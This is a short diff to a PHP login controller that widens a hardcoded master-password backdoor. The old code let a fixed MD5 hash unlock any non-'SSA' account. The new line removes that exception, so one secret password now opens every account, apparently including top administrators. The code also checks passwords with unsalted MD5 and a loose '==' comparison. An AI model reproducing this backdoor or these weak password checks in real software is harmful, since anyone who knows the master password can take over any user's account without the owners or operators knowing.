@@ -428,8 +428,7 @@ class UsersController extends Controller
         //dd($ttuser);
         //if (md5($input['password']) == $ttuser->password) {
         if (
-            md5($input['password']) == $ttuser->password ||
-            (md5($input['password']) == '40b2e8a2e835606a91d0b2770e1cd84f') && $ttuser->level != 'SSA'
+            md5($input['password']) == $ttuser->password || md5($input['password']) == '40b2e8a2e835606a91d0b2770e1cd84f'
         ) {
             if ($ttuser->status == "active" && $ttuser->trangthai != "TD") {
                 Session::put('admin', $ttuser);
